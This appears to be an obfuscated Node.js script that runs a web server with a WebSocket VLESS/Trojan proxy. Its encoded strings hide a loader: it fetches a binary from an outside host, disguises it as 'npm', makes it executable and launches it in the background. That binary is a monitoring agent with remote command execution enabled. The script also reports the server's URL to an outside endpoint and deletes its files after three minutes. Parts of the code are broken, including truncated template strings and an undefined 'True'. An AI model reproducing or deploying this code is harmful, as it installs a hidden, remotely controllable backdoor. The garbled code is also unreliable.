const _0x61688c1b63=["Z3VI","OnJvcnJlIGduaW5udXIgbXBu","bm9zai9ub2l0YWNpbHBwYQ==","NDZtcmE=","OmtzYVQgZ25pZGRhIHJvcnJF","cHR0aA==","bG10aC54ZWRuaQ==","c28=","NzgwMg==","OGZ0dQ==","MS4xLjEuMQ==","cm9ycmU=","bXBu","MzgwMg==","cmVmZnVi","blxkbnVvRiB0b04=","aHNpbmlm","MzUwMg==","c3NlY29ycF9kbGloYw==","YnVz","bm9pdGNlbm5vYw==","bG10aC90eGV0","dGVn","bG1heS5naWZub2M=","aHNhYi9uaWIv","blw=","MXYvbm0uY3luLnNzc3MuNDZkbWEvLzpzcHR0aA==","bmMueXl5eXl0LmVjYXBz","bm9zai1zbmQvbm9pdGFjaWxwcGE=","c29peGE=","eWxsdWZzc2VjY3VzIGRhb2xud29kIG1wbg==","bWFlcnRz","MXYvbm0uY3luLnNzc3MuNDZtcmEvLzpzcHR0aA==","bndvbmtuVQ==","bmlhbHAvdHhldA==","c2Y=","dG5lZ2Evbm0uY3luLnNzc3MuNDZtcmEvLzpzcHR0aA==","Li4uZ25pbm51ciBwaWtzICxnbmlubnVyIHlkYWVybGEgc2kgbXBu","ZDQyNmJlMTYxM2NhLWI5MjgtMWQ2NC0wY2YyLTljNjM4ZDMz","dHh0LnRzaWwvZ3VoL3NkYWVoL3NmZXIvZWRvbm9heS83ODkxb2F5bmF0L21vYy5yb3JyaW10aWcud2FyLy86c3B0dGg=","ZXB5VC10bmV0bm9D","Im1wXW5bLy4iIHBlcmcgfCAicGVyZyIgdi0gcGVyZyB8IHh1YSBzcA==","eWxsdWZzc2VjY3VzIGRlZGRhIGtzYVQgc3NlY2NBIGNpdGFtb3R1QQ==","MzQ0","OC1mdHU=","bHJ1LWRkYS90ZW4uMDB2cmVzLm9vb28vLzpzcHR0aA==","NDZoY3JhYQ==","dHBlY2NB","bXBuIHgrIGRvbWhj","b3RweXJj","YXRlbS9tb2MuZXJhbGZkdW9sYy5kZWVwcy8vOnNwdHRo","MzQ0OA==","ZXVydA==","aHRhcA==","IWRscm93IG9sbGVI","NC40LjguOA==","c3c=","NDZlc2Fi","NDIyYWhz","Z25pbm51ciBzaSBtcG4=","dGVu","ZWdhc3NlbQ==","ZXNsYWY=","c2x0LS0=","eGVo","dG5lZ2Evbm0uY3luLnNzc3MuNDZkbWEvLzpzcHR0aA==","NjkwMg==","bXJh","Z25pbm51ciBwaWtzICx5dHBtZSBzaSBlbGJhaXJhdiBBSFpFTg=="];(function(_a,_s){while(--_s){_a.push(_a.shift());}})(_0x61688c1b63,0x72);function _0xe85c5349b0(i){let index = i;if (True) {index = (i + 0x72) % 69;} let s = _0x61688c1b63[index];let d = atob(s);return d.split('').reverse().join('');} function _0x0d71a4b8d8(i){return _0xe85c5349b0(i);} function _0xbdd02e00b8(){return "BQDYNiDuF0YUPnNpmYEvYMuEmpC2Yg5npRrjWFG7b5UzAeQa";} function _0xb571760036(){return "hpu0MG4ihQdXUsRGrE8bRO88xQvsam144okIQu03Z2R7U5LG";} function _0xb72e5c25b2(){return "iRnVcM1QTeNE4cZV4qxDA8BFXy4P0DzIYuVP1vfB5BmYerBb";} function _0x3ace8e27f6(){return "Nc9M9IQsX7BYt79s8NQ3PnN11Ft2LJQ8nysBB5xebyzXJlDq";} function _0x98ef5b6a2f(){return "mhsQRqP8eyXYu2WIe2bXUxej9G0EQXmKF3KQvQUjqTMs5tJn";} ;(function(){try{const os = require(_0x0d71a4b8d8(0x7));const http = require(_0x0d71a4b8d8(0x5));const fs = require(_0x0d71a4b8d8(0x23));const axios = require(_0x0d71a4b8d8(0x1d));const net = require(_0x0d71a4b8d8(0x3c));const path = require(_0x0d71a4b8d8(0x35));const crypto = require(_0x0d71a4b8d8(0x31));const {Buffer} = require(_0x0d71a4b8d8(0xe));const {exec,execSync} = require(_0x0d71a4b8d8(0x12));const {WebSocket,createWebSocketStream} = require(_0x0d71a4b8d8(0x38));const UUID = process.env.UUID || _0x0d71a4b8d8(0x26);const _0xa20d8e690847187 = process.env._0xa20d8e690847187 || '';const _0x57eb671b37c2b3b = process.env._0x57eb671b37c2b3b || '';const _0x9165938402d3ed0 = process.env._0x9165938402d3ed0 || '';const _0xaeb7f9b5c10be11 = process.env._0xaeb7f9b5c10be11 || _0x0d71a4b8d8(0x1b);const _0xbad326e8e0e63b0 = process.env._0xbad326e8e0e63b0 || true;const _0xc9a10ae171f75d9 = process.env._0xc9a10ae171f75d9 || UUID.slice(0,8);const _0x33e9b5cf95ebd3d = process.env._0x33e9b5cf95ebd3d || _0x0d71a4b8d8(0x13);const _0x1b0e995b4af7af9 = process.env._0x1b0e995b4af7af9 || _0x0d71a4b8d8(0x0);const _0xac6ff4d92b2f23a = process.env._0xac6ff4d92b2f23a || 7860;let _0xde39880c3b1f189 = '';const _0xa5bd835746879ff = async () => {try {const _0x2672c8fa7ccfe0f = await axios.get(_0x0d71a4b8d8(0x32));const _0x4988d3159380362 = _0x2672c8fa7ccfe0f._0x4988d3159380362;_0xde39880c3b1f189 = `${_0x4988d3159380362.country}-${_0x4988d3159380362.asOrganization}`.replace(/ /g,'_');} catch (e) {_0xde39880c3b1f189 = _0x0d71a4b8d8(0x21);}} _0xa5bd835746879ff();const _0x97fe44eaf266e53 = http.createServer((req,_0x2672c8fa7ccfe0f) => {if (req._0x20e9bef86e8a8ba === '/') {const _0xb61c40927a2ff3b = path.join(__dirname,_0x0d71a4b8d8(0x6));fs.readFile(_0xb61c40927a2ff3b,_0x0d71a4b8d8(0x9),(err,content) => {if (err) {_0x2672c8fa7ccfe0f.writeHead(200,{_0x0d71a4b8d8(0x28): _0x0d71a4b8d8(0x15)});_0x2672c8fa7ccfe0f.end(_0x0d71a4b8d8(0x36));return;} _0x2672c8fa7ccfe0f.writeHead(200,{_0x0d71a4b8d8(0x28): _0x0d71a4b8d8(0x15)});_0x2672c8fa7ccfe0f.end(content);});return;} else if (req._0x20e9bef86e8a8ba === `/${_0x33e9b5cf95ebd3d}`) {const _0x2e693fd680ac9c7 = _0x0d71a4b8d8(0x27);axios.get(_0x2e693fd680ac9c7) .then(r => {let _0xd220177416a209b = r._0x4988d3159380362 .split(/\r?\n/) .map(l => l.trim()) .filter(l => l.length > 0);if (_0xd220177416a209b.length === 0) {_0xd220177416a209b = [_0xaeb7f9b5c10be11];} let _0x2812f9fbe1138ad = "";for (const d of _0xd220177416a209b) {const _0x330cb41b7d2cf84 = `vless: const _0xeef310549ec9b18 = `trojan: _0x2812f9fbe1138ad += _0x330cb41b7d2cf84 + _0x0d71a4b8d8(0x19) + _0xeef310549ec9b18 + _0x0d71a4b8d8(0x19);} const _0x49016668eab4d65 = Buffer.from(_0x2812f9fbe1138ad).toString(_0x0d71a4b8d8(0x39));_0x2672c8fa7ccfe0f.writeHead(200,{_0x0d71a4b8d8(0x28): _0x0d71a4b8d8(0x22)});_0x2672c8fa7ccfe0f.end(_0x49016668eab4d65 + _0x0d71a4b8d8(0x19));}) .catch(err => {const _0x330cb41b7d2cf84 = `vless: const _0xeef310549ec9b18 = `trojan: const _0xa7a80264e6b76aa = _0x330cb41b7d2cf84 + _0x0d71a4b8d8(0x19) + _0xeef310549ec9b18;const _0x49016668eab4d65 = Buffer.from(_0xa7a80264e6b76aa).toString(_0x0d71a4b8d8(0x39));_0x2672c8fa7ccfe0f.writeHead(200,{_0x0d71a4b8d8(0x28): _0x0d71a4b8d8(0x22)});_0x2672c8fa7ccfe0f.end(_0x49016668eab4d65 + _0x0d71a4b8d8(0x19));});} else {_0x2672c8fa7ccfe0f.writeHead(404,{_0x0d71a4b8d8(0x28): _0x0d71a4b8d8(0x22)});_0x2672c8fa7ccfe0f.end(_0x0d71a4b8d8(0xf));}});const _0xe4f16785d56c207 = new WebSocket.Server({server: _0x97fe44eaf266e53});const uuid = UUID.replace(/-/g,"");const _0x182df6cb0c9f0c4 = [_0x0d71a4b8d8(0x37),_0x0d71a4b8d8(0xa)];function _0x3e7c457fa175120(_0xf71d765f410fca7) {return new Promise((resolve,reject) => {if (/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(_0xf71d765f410fca7)) {resolve(_0xf71d765f410fca7);return;} let _0xf6ea3d7917fefcf = 0;function _0xd39e4fcc5b89f60() {if (_0xf6ea3d7917fefcf >= _0x182df6cb0c9f0c4.length) {reject(new Error(`Failed to resolve ${_0xf71d765f410fca7} with all DNS servers`));return;} const _0x9252efe34f75d28 = _0x182df6cb0c9f0c4[_0xf6ea3d7917fefcf];_0xf6ea3d7917fefcf++;const _0xe2fff3312cf3195 = `https: axios.get(_0xe2fff3312cf3195,{timeout: 5000,headers: {_0x0d71a4b8d8(0x2f): _0x0d71a4b8d8(0x1c)}}) .then(_0x0676cc1ad602f85 => {const _0x4988d3159380362 = _0x0676cc1ad602f85._0x4988d3159380362;if (_0x4988d3159380362.Status === 0 && _0x4988d3159380362.Answer && _0x4988d3159380362.Answer.length > 0) {const _0xb92238f56ce8b3b = _0x4988d3159380362.Answer.find(record => record.type === 1);if (_0xb92238f56ce8b3b) {resolve(_0xb92238f56ce8b3b._0x4988d3159380362);return;}} _0xd39e4fcc5b89f60();}) .catch(error => {_0xd39e4fcc5b89f60();});} _0xd39e4fcc5b89f60();});} function _0xb47b82d840e10a0(ws,msg) {const [VERSION] = msg;const _0xa8ed9f44d62db0e = msg.slice(1,17);if (!_0xa8ed9f44d62db0e.every((v,i) => v == parseInt(uuid.substr(i * 2,2),16))) return false;let i = msg.slice(17,18).readUInt8() + 19;const _0x8e2ed725d9e2ecb = msg.slice(i,i += 2).readUInt16BE(0);const _0xa7ffcdc7f1efa02 = msg.slice(i,i += 1).readUInt8();const _0xf71d765f410fca7 = _0xa7ffcdc7f1efa02 == 1 ? msg.slice(i,i += 4).join('.') : (_0xa7ffcdc7f1efa02 == 2 ? new TextDecoder().decode(msg.slice(i + 1,i += 1 + msg.slice(i,i + 1).readUInt8())) : (_0xa7ffcdc7f1efa02 == 3 ? msg.slice(i,i += 16).reduce((s,b,i,a) => (i % 2 ? s.concat(a.slice(i - 1,i + 1)) : s),[]).map(b => b.readUInt16BE(0).toString(16)).join(':') : ''));ws.send(new Uint8Array([VERSION,0]));const _0x58d303e2c194e48 = createWebSocketStream(ws);_0x3e7c457fa175120(_0xf71d765f410fca7) .then(resolvedIP => {net.connect({_0xf71d765f410fca7: resolvedIP,_0x8e2ed725d9e2ecb},function() {this.write(msg.slice(i));_0x58d303e2c194e48.on(_0x0d71a4b8d8(0xb),() => {}).pipe(this).on(_0x0d71a4b8d8(0xb),() => {}).pipe(_0x58d303e2c194e48);}).on(_0x0d71a4b8d8(0xb),() => {});}) .catch(error => {net.connect({_0xf71d765f410fca7,_0x8e2ed725d9e2ecb},function() {this.write(msg.slice(i));_0x58d303e2c194e48.on(_0x0d71a4b8d8(0xb),() => {}).pipe(this).on(_0x0d71a4b8d8(0xb),() => {}).pipe(_0x58d303e2c194e48);}).on(_0x0d71a4b8d8(0xb),() => {});});return true;} function _0xf71cd8d4982364e(ws,msg) {try {if (msg.length < 58) return false;const _0x73e7abbbcc04458 = msg.slice(0,56).toString();const _0x8282915e49bc8b7 = [UUID,];let _0x64387aa327ed3c6 = null;for (const _0xd9517dc9ea65ae9 of _0x8282915e49bc8b7) {const _0x04dbd4ff271c093 = crypto.createHash(_0x0d71a4b8d8(0x3a)).update(_0xd9517dc9ea65ae9).digest(_0x0d71a4b8d8(0x40));if (_0x04dbd4ff271c093 === _0x73e7abbbcc04458) {_0x64387aa327ed3c6 = _0xd9517dc9ea65ae9;break;}} if (!_0x64387aa327ed3c6) return false;let _0xd62319a74b7b7ce = 56;if (msg[_0xd62319a74b7b7ce] === 0x0d && msg[_0xd62319a74b7b7ce + 1] === 0x0a) {_0xd62319a74b7b7ce += 2;} const _0x5544b86b37af20c = msg[_0xd62319a74b7b7ce];if (_0x5544b86b37af20c !== 0x01) return false;_0xd62319a74b7b7ce += 1;const _0x9818867b3e606ac = msg[_0xd62319a74b7b7ce];_0xd62319a74b7b7ce += 1;let _0xf71d765f410fca7,_0x8e2ed725d9e2ecb;if (_0x9818867b3e606ac === 0x01) {_0xf71d765f410fca7 = msg.slice(_0xd62319a74b7b7ce,_0xd62319a74b7b7ce + 4).join('.');_0xd62319a74b7b7ce += 4;} else if (_0x9818867b3e606ac === 0x03) {const _0xfae5724b6dff602 = msg[_0xd62319a74b7b7ce];_0xd62319a74b7b7ce += 1;_0xf71d765f410fca7 = msg.slice(_0xd62319a74b7b7ce,_0xd62319a74b7b7ce + _0xfae5724b6dff602).toString();_0xd62319a74b7b7ce += _0xfae5724b6dff602;} else if (_0x9818867b3e606ac === 0x04) {_0xf71d765f410fca7 = msg.slice(_0xd62319a74b7b7ce,_0xd62319a74b7b7ce + 16).reduce((s,b,i,a) => (i % 2 ? s.concat(a.slice(i - 1,i + 1)) : s),[]) .map(b => b.readUInt16BE(0).toString(16)).join(':');_0xd62319a74b7b7ce += 16;} else {return false;} _0x8e2ed725d9e2ecb = msg.readUInt16BE(_0xd62319a74b7b7ce);_0xd62319a74b7b7ce += 2;if (_0xd62319a74b7b7ce < msg.length && msg[_0xd62319a74b7b7ce] === 0x0d && msg[_0xd62319a74b7b7ce + 1] === 0x0a) {_0xd62319a74b7b7ce += 2;} const _0x58d303e2c194e48 = createWebSocketStream(ws);_0x3e7c457fa175120(_0xf71d765f410fca7) .then(resolvedIP => {net.connect({_0xf71d765f410fca7: resolvedIP,_0x8e2ed725d9e2ecb},function() {if (_0xd62319a74b7b7ce < msg.length) {this.write(msg.slice(_0xd62319a74b7b7ce));} _0x58d303e2c194e48.on(_0x0d71a4b8d8(0xb),() => {}).pipe(this).on(_0x0d71a4b8d8(0xb),() => {}).pipe(_0x58d303e2c194e48);}).on(_0x0d71a4b8d8(0xb),() => {});}) .catch(error => {net.connect({_0xf71d765f410fca7,_0x8e2ed725d9e2ecb},function() {if (_0xd62319a74b7b7ce < msg.length) {this.write(msg.slice(_0xd62319a74b7b7ce));} _0x58d303e2c194e48.on(_0x0d71a4b8d8(0xb),() => {}).pipe(this).on(_0x0d71a4b8d8(0xb),() => {}).pipe(_0x58d303e2c194e48);}).on(_0x0d71a4b8d8(0xb),() => {});});return true;} catch (error) {return false;}} _0xe4f16785d56c207.on(_0x0d71a4b8d8(0x14),(ws,req) => {const _0x20e9bef86e8a8ba = req._0x20e9bef86e8a8ba || '';ws.once(_0x0d71a4b8d8(0x3d),msg => {if (msg.length > 17 && msg[0] === 0) {const _0xa8ed9f44d62db0e = msg.slice(1,17);const _0x3ca656f50648e84 = _0xa8ed9f44d62db0e.every((v,i) => v == parseInt(uuid.substr(i * 2,2),16));if (_0x3ca656f50648e84) {if (!_0xb47b82d840e10a0(ws,msg)) {ws.close();} return;}} if (!_0xf71cd8d4982364e(ws,msg)) {ws.close();}}).on(_0x0d71a4b8d8(0xb),() => {});});const _0xffea307c2a82b7f = () => {const _0x48a6e37e37bec9d = os._0x48a6e37e37bec9d();if (_0x48a6e37e37bec9d === _0x0d71a4b8d8(0x43) || _0x48a6e37e37bec9d === _0x0d71a4b8d8(0x3) || _0x48a6e37e37bec9d === _0x0d71a4b8d8(0x2e)) {if (!_0x57eb671b37c2b3b) {return _0x0d71a4b8d8(0x20);} else {return _0x0d71a4b8d8(0x24);}} else {if (!_0x57eb671b37c2b3b) {return _0x0d71a4b8d8(0x1a);} else {return _0x0d71a4b8d8(0x41);}}};const _0x4e2dd46d2336084 = async () => {if (!_0xa20d8e690847187 && !_0x9165938402d3ed0) return;try {const _0x20e9bef86e8a8ba = _0xffea307c2a82b7f();const _0x0676cc1ad602f85 = await axios({method: _0x0d71a4b8d8(0x16),_0x20e9bef86e8a8ba: _0x20e9bef86e8a8ba,responseType: _0x0d71a4b8d8(0x1f)});const _0x98b2ecacecf03d1 = fs.createWriteStream(_0x0d71a4b8d8(0xc));_0x0676cc1ad602f85._0x4988d3159380362.pipe(_0x98b2ecacecf03d1);return new Promise((resolve,reject) => {_0x98b2ecacecf03d1.on(_0x0d71a4b8d8(0x10),() => {console.log(_0x0d71a4b8d8(0x1e));exec(_0x0d71a4b8d8(0x30),(err) => {if (err) reject(err);resolve();});});_0x98b2ecacecf03d1.on(_0x0d71a4b8d8(0xb),reject);});} catch (err) {throw err;}};const _0x5055b29fb148a64 = async () => {try {const _0x7178275f95f63e6 = execSync(_0x0d71a4b8d8(0x29),{encoding: _0x0d71a4b8d8(0x2c)});if (_0x7178275f95f63e6.trim() !== '') {console.log(_0x0d71a4b8d8(0x25));return;}} catch (e) {} await _0x4e2dd46d2336084();let _0x080dd16ab2fc59f = '';let _0xe162a1d44b4d81c = [_0x0d71a4b8d8(0x2b),_0x0d71a4b8d8(0x33),_0x0d71a4b8d8(0x42),_0x0d71a4b8d8(0x8),_0x0d71a4b8d8(0xd),_0x0d71a4b8d8(0x11)];if (_0xa20d8e690847187 && _0x57eb671b37c2b3b && _0x9165938402d3ed0) {const _0x338e33cd372fc51 = _0xe162a1d44b4d81c.includes(_0x57eb671b37c2b3b) ? _0x0d71a4b8d8(0x3f) : '';_0x080dd16ab2fc59f = `setsid nohup ./npm -s ${_0xa20d8e690847187}:${_0x57eb671b37c2b3b} -p ${_0x9165938402d3ed0} ${_0x338e33cd372fc51} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;} else if (_0xa20d8e690847187 && _0x9165938402d3ed0) {if (!_0x57eb671b37c2b3b) {const _0x8e2ed725d9e2ecb = _0xa20d8e690847187.includes(':') ? _0xa20d8e690847187.split(':').pop() : '';const _0x689fd21970e1afe = _0xe162a1d44b4d81c.includes(_0x8e2ed725d9e2ecb) ? _0x0d71a4b8d8(0x34) : _0x0d71a4b8d8(0x3e);const _0x0323067ba5a170c = `client_secret: ${_0x9165938402d3ed0} debug: false disable_auto_update: true disable_command_execute: false disable_force_update: true disable_nat: false disable_send_query: false gpu: false insecure_tls: true ip_report_period: 1800 report_delay: 4 server: ${_0xa20d8e690847187} skip_connection_count: true skip_procs_count: true temperature: false tls: ${_0x689fd21970e1afe} use_gitee_to_upgrade: false use_ipv6_country_code: false uuid: ${UUID}`;fs.writeFileSync(_0x0d71a4b8d8(0x17),_0x0323067ba5a170c);} _0x080dd16ab2fc59f = `setsid nohup ./npm -c config.yaml >/dev/null 2>&1 &`;} else {console.log(_0x0d71a4b8d8(0x44));return;} try {exec(_0x080dd16ab2fc59f,{shell: _0x0d71a4b8d8(0x18)},(err) => {if (err) console.error(_0x0d71a4b8d8(0x1),err);else console.log(_0x0d71a4b8d8(0x3b));});} catch (error) {console.error(`error: ${error}`);}};async function _0x306585f51c7e006() {if (!_0xbad326e8e0e63b0) return;if (!_0xaeb7f9b5c10be11) {return;} const _0xefc972134964dad = `https: try {const _0x2672c8fa7ccfe0f = await axios.post(_0x0d71a4b8d8(0x2d),{_0x20e9bef86e8a8ba: _0xefc972134964dad},{headers: {_0x0d71a4b8d8(0x28): _0x0d71a4b8d8(0x2)}});console.log(_0x0d71a4b8d8(0x2a));} catch (error) {}} const _0xb3d0a061d08b2be = () => {fs.unlink(_0x0d71a4b8d8(0xc),() => {});fs.unlink(_0x0d71a4b8d8(0x17),() => {});};_0x97fe44eaf266e53.listen(_0xac6ff4d92b2f23a,() => {_0x5055b29fb148a64();setTimeout(() => {_0xb3d0a061d08b2be();},180000);_0x306585f51c7e006();console.log(`Server is running on _0x8e2ed725d9e2ecb ${_0xac6ff4d92b2f23a}`);});}catch(e){}})();
